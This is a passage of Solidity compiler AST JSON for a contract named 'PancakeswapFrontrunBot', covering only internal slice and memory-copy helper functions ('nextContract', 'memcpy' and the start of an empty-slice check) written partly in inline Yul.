																			"typeIdentifier": "t_struct$_slice_$126_memory_ptr",
																			"typeString": "struct PancakeswapFrontrunBot.slice memory"
																		}
																	},
																	"id": 484,
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "_len",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 123,
																	"src": "5244:9:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "5232:21:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 486,
															"nodeType": "ExpressionStatement",
															"src": "5232:21:3"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 492,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 487,
																		"name": "self",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 409,
																		"src": "5268:4:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_struct$_slice_$126_memory_ptr",
																			"typeString": "struct PancakeswapFrontrunBot.slice memory"
																		}
																	},
																	"id": 489,
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"memberName": "_ptr",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 125,
																	"src": "5268:9:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "+=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 490,
																		"name": "self",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 409,
																		"src": "5281:4:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_struct$_slice_$126_memory_ptr",
																			"typeString": "struct PancakeswapFrontrunBot.slice memory"
																		}
																	},
																	"id": 491,
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "_len",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 123,
																	"src": "5281:9:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "5268:22:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 493,
															"nodeType": "ExpressionStatement",
															"src": "5268:22:3"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 498,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 494,
																		"name": "self",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 409,
																		"src": "5305:4:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_struct$_slice_$126_memory_ptr",
																			"typeString": "struct PancakeswapFrontrunBot.slice memory"
																		}
																	},
																	"id": 496,
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"memberName": "_len",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 123,
																	"src": "5305:9:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 497,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "5317:1:3",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																},
																"src": "5305:13:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 499,
															"nodeType": "ExpressionStatement",
															"src": "5305:13:3"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 500,
																"name": "rune",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 411,
																"src": "5340:4:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_struct$_slice_$126_memory_ptr",
																	"typeString": "struct PancakeswapFrontrunBot.slice memory"
																}
															},
															"functionReturnParameters": 415,
															"id": 501,
															"nodeType": "Return",
															"src": "5333:11:3"
														}
													]
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 508,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 504,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 409,
															"src": "5369:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$126_memory_ptr",
																"typeString": "struct PancakeswapFrontrunBot.slice memory"
															}
														},
														"id": 506,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"memberName": "_ptr",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 125,
														"src": "5369:9:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "+=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 507,
														"name": "l",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 438,
														"src": "5382:1:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "5369:14:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 509,
												"nodeType": "ExpressionStatement",
												"src": "5369:14:3"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 514,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 510,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 409,
															"src": "5394:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$126_memory_ptr",
																"typeString": "struct PancakeswapFrontrunBot.slice memory"
															}
														},
														"id": 512,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 123,
														"src": "5394:9:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "-=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 513,
														"name": "l",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 438,
														"src": "5407:1:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "5394:14:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 515,
												"nodeType": "ExpressionStatement",
												"src": "5394:14:3"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 520,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 516,
															"name": "rune",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 411,
															"src": "5419:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$126_memory_ptr",
																"typeString": "struct PancakeswapFrontrunBot.slice memory"
															}
														},
														"id": 518,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 123,
														"src": "5419:9:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 519,
														"name": "l",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 438,
														"src": "5431:1:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "5419:13:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 521,
												"nodeType": "ExpressionStatement",
												"src": "5419:13:3"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 522,
													"name": "rune",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 411,
													"src": "5450:4:3",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$126_memory_ptr",
														"typeString": "struct PancakeswapFrontrunBot.slice memory"
													}
												},
												"functionReturnParameters": 415,
												"id": 523,
												"nodeType": "Return",
												"src": "5443:11:3"
											}
										]
									},
									"documentation": null,
									"id": 525,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "nextContract",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 412,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 409,
												"mutability": "mutable",
												"name": "self",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 525,
												"src": "4564:17:3",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$126_memory_ptr",
													"typeString": "struct PancakeswapFrontrunBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 408,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 126,
													"src": "4564:5:3",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$126_storage_ptr",
														"typeString": "struct PancakeswapFrontrunBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 411,
												"mutability": "mutable",
												"name": "rune",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 525,
												"src": "4583:17:3",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$126_memory_ptr",
													"typeString": "struct PancakeswapFrontrunBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 410,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 126,
													"src": "4583:5:3",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$126_storage_ptr",
														"typeString": "struct PancakeswapFrontrunBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4563:38:3"
									},
									"returnParameters": {
										"id": 415,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 414,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 525,
												"src": "4625:12:3",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$126_memory_ptr",
													"typeString": "struct PancakeswapFrontrunBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 413,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 126,
													"src": "4625:5:3",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$126_storage_ptr",
														"typeString": "struct PancakeswapFrontrunBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4624:14:3"
									},
									"scope": 1724,
									"src": "4542:920:3",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 564,
										"nodeType": "Block",
										"src": "5531:493:3",
										"statements": [
											{
												"body": {
													"id": 550,
													"nodeType": "Block",
													"src": "5608:142:3",
													"statements": [
														{
															"AST": {
																"nodeType": "YulBlock",
																"src": "5632:58:3",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"name": "dest",
																					"nodeType": "YulIdentifier",
																					"src": "5658:4:3"
																				},
																				{
																					"arguments": [
																						{
																							"name": "src",
																							"nodeType": "YulIdentifier",
																							"src": "5670:3:3"
																						}
																					],
																					"functionName": {
																						"name": "mload",
																						"nodeType": "YulIdentifier",
																						"src": "5664:5:3"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "5664:10:3"
																				}
																			],
																			"functionName": {
																				"name": "mstore",
																				"nodeType": "YulIdentifier",
																				"src": "5651:6:3"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "5651:24:3"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "5651:24:3"
																	}
																]
															},
															"evmVersion": "istanbul",
															"externalReferences": [
																{
																	"declaration": 527,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "5658:4:3",
																	"valueSize": 1
																},
																{
																	"declaration": 529,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "5670:3:3",
																	"valueSize": 1
																}
															],
															"id": 541,
															"nodeType": "InlineAssembly",
															"src": "5623:67:3"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 544,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 542,
																	"name": "dest",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 527,
																	"src": "5704:4:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "+=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "3332",
																	"id": 543,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "5712:2:3",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_32_by_1",
																		"typeString": "int_const 32"
																	},
																	"value": "32"
																},
																"src": "5704:10:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 545,
															"nodeType": "ExpressionStatement",
															"src": "5704:10:3"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 548,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 546,
																	"name": "src",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 529,
																	"src": "5729:3:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "+=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "3332",
																	"id": 547,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "5736:2:3",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_32_by_1",
																		"typeString": "int_const 32"
																	},
																	"value": "32"
																},
																"src": "5729:9:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 549,
															"nodeType": "ExpressionStatement",
															"src": "5729:9:3"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 536,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 534,
														"name": "len",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 531,
														"src": "5586:3:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": ">=",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "3332",
														"id": 535,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "5593:2:3",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_32_by_1",
															"typeString": "int_const 32"
														},
														"value": "32"
													},
													"src": "5586:9:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 551,
												"initializationExpression": null,
												"loopExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 539,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftHandSide": {
															"argumentTypes": null,
															"id": 537,
															"name": "len",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 531,
															"src": "5597:3:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "Assignment",
														"operator": "-=",
														"rightHandSide": {
															"argumentTypes": null,
															"hexValue": "3332",
															"id": 538,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "5604:2:3",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_32_by_1",
																"typeString": "int_const 32"
															},
															"value": "32"
														},
														"src": "5597:9:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 540,
													"nodeType": "ExpressionStatement",
													"src": "5597:9:3"
												},
												"nodeType": "ForStatement",
												"src": "5580:170:3"
											},
											{
												"assignments": [
													553
												],
												"declarations": [
													{
														"constant": false,
														"id": 553,
														"mutability": "mutable",
														"name": "mask",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 564,
														"src": "5796:9:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 552,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "5796:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 562,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 561,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 559,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"hexValue": "323536",
															"id": 554,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "5808:3:3",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_256_by_1",
																"typeString": "int_const 256"
															},
															"value": "256"
														},
														"nodeType": "BinaryOperation",
														"operator": "**",
														"rightExpression": {
															"argumentTypes": null,
															"components": [
																{
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 557,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"hexValue": "3332",
																		"id": 555,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "5816:2:3",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_32_by_1",
																			"typeString": "int_const 32"
																		},
																		"value": "32"
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "-",
																	"rightExpression": {
																		"argumentTypes": null,
																		"id": 556,
																		"name": "len",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 531,
																		"src": "5821:3:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"src": "5816:8:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"id": 558,
															"isConstant": false,
															"isInlineArray": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"nodeType": "TupleExpression",
															"src": "5815:10:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"src": "5808:17:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "-",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "31",
														"id": 560,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "5828:1:3",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_1_by_1",
															"typeString": "int_const 1"
														},
														"value": "1"
													},
													"src": "5808:21:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "5796:33:3"
											},
											{
												"AST": {
													"nodeType": "YulBlock",
													"src": "5849:168:3",
													"statements": [
														{
															"nodeType": "YulVariableDeclaration",
															"src": "5864:41:3",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "src",
																				"nodeType": "YulIdentifier",
																				"src": "5889:3:3"
																			}
																		],
																		"functionName": {
																			"name": "mload",
																			"nodeType": "YulIdentifier",
																			"src": "5883:5:3"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "5883:10:3"
																	},
																	{
																		"arguments": [
																			{
																				"name": "mask",
																				"nodeType": "YulIdentifier",
																				"src": "5899:4:3"
																			}
																		],
																		"functionName": {
																			"name": "not",
																			"nodeType": "YulIdentifier",
																			"src": "5895:3:3"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "5895:9:3"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nodeType": "YulIdentifier",
																	"src": "5879:3:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "5879:26:3"
															},
															"variables": [
																{
																	"name": "srcpart",
																	"nodeType": "YulTypedName",
																	"src": "5868:7:3",
																	"type": ""
																}
															]
														},
														{
															"nodeType": "YulVariableDeclaration",
															"src": "5919:38:3",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dest",
																				"nodeType": "YulIdentifier",
																				"src": "5945:4:3"
																			}
																		],
																		"functionName": {
																			"name": "mload",
																			"nodeType": "YulIdentifier",
																			"src": "5939:5:3"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "5939:11:3"
																	},
																	{
																		"name": "mask",
																		"nodeType": "YulIdentifier",
																		"src": "5952:4:3"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nodeType": "YulIdentifier",
																	"src": "5935:3:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "5935:22:3"
															},
															"variables": [
																{
																	"name": "destpart",
																	"nodeType": "YulTypedName",
																	"src": "5923:8:3",
																	"type": ""
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "dest",
																		"nodeType": "YulIdentifier",
																		"src": "5978:4:3"
																	},
																	{
																		"arguments": [
																			{
																				"name": "destpart",
																				"nodeType": "YulIdentifier",
																				"src": "5987:8:3"
																			},
																			{
																				"name": "srcpart",
																				"nodeType": "YulIdentifier",
																				"src": "5997:7:3"
																			}
																		],
																		"functionName": {
																			"name": "or",
																			"nodeType": "YulIdentifier",
																			"src": "5984:2:3"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "5984:21:3"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "5971:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "5971:35:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "5971:35:3"
														}
													]
												},
												"evmVersion": "istanbul",
												"externalReferences": [
													{
														"declaration": 527,
														"isOffset": false,
														"isSlot": false,
														"src": "5945:4:3",
														"valueSize": 1
													},
													{
														"declaration": 527,
														"isOffset": false,
														"isSlot": false,
														"src": "5978:4:3",
														"valueSize": 1
													},
													{
														"declaration": 553,
														"isOffset": false,
														"isSlot": false,
														"src": "5899:4:3",
														"valueSize": 1
													},
													{
														"declaration": 553,
														"isOffset": false,
														"isSlot": false,
														"src": "5952:4:3",
														"valueSize": 1
													},
													{
														"declaration": 529,
														"isOffset": false,
														"isSlot": false,
														"src": "5889:3:3",
														"valueSize": 1
													}
												],
												"id": 563,
												"nodeType": "InlineAssembly",
												"src": "5840:177:3"
											}
										]
									},
									"documentation": null,
									"id": 565,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "memcpy",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 532,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 527,
												"mutability": "mutable",
												"name": "dest",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 565,
												"src": "5487:9:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 526,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "5487:4:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 529,
												"mutability": "mutable",
												"name": "src",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 565,
												"src": "5498:8:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 528,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "5498:4:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 531,
												"mutability": "mutable",
												"name": "len",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 565,
												"src": "5508:8:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 530,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "5508:4:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "5486:31:3"
									},
									"returnParameters": {
										"id": 533,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "5531:0:3"
									},
									"scope": 1724,
									"src": "5471:553:3",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "private"
								},
								{
									"body": {
										"id": 711,
										"nodeType": "Block",
										"src": "6300:1060:3",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 575,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 572,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 567,
															"src": "6315:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$126_memory_ptr",
																"typeString": "struct PancakeswapFrontrunBot.slice memory"
															}
														},
														"id": 573,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 123,
														"src": "6315:9:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 574,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "6328:1:3",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "6315:14:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 579,
												"nodeType": "IfStatement",
												"src": "6311:55:3",
												"trueBody": {
													"id": 578,
													"nodeType": "Block",
													"src": "6331:35:3",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 576,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "6353:1:3",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"functionReturnParameters": 571,
															"id": 577,
															"nodeType": "Return",
															"src": "6346:8:3"
														}
													]
												}
											},
											{
												"assignments": [
													581
												],
												"declarations": [
													{
														"constant": false,
														"id": 581,
														"mutability": "mutable",
														"name": "word",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 711,
														"src": "6379:9:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 580,
